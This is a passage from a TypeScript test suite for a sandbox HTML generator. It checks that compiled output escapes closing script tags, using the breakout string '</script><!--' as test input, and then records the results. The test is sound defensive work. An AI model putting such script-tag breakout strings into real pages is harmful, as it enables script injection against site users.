        assertTrue(!html.includes('__iframeCompile'), 'Must not contain iframe Function compiler');
        assertTrue(!html.includes('</script><!--'), 'Compiled </script> string must be escaped cleanly');
        assertTrue(
          SandboxBuilderEngine.escapeScriptTag('</script><!--') === '<\\/script><\\!--',
          'SandboxBuilderEngine.escapeScriptTag must neutralize closing tags'
        );
      },
    },
  ];

  const results: TestCaseResult[] = [];
  for (const t of tests) {
    try {
      await t.fn();
      results.push({ suite: 'Generator & Runtime', name: t.name, passed: true });
    } catch (err) {
      results.push({
        suite: 'Generator & Runtime',
        name: t.name,
        passed: false,
        error: err instanceof Error ? err.message : String(err),
      });
    }
  }
  return results;
}
